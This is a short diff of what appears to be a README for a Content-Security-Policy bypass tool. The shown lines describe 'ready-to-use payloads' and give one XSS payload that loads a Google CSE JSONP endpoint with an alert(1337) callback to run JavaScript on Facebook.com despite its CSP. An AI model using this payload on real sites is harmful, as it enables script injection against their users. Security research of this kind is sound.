@@ -17,6 +17,7 @@ The tool is not yet fully completed as I'm still adding some validations and fea
 The repo contains ready-to-use payloads that can bypass CSP for Facebook.com, Google.com and more.
 
 **Bypasing Facebook.com Content-Security policy:**
+
 Facebook.com allows *.google.com in its CSP policy (script-src directive), thus, below payload would work like a charm to execute JavaScript on Facebook.com:
 `"><script+src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>`
 
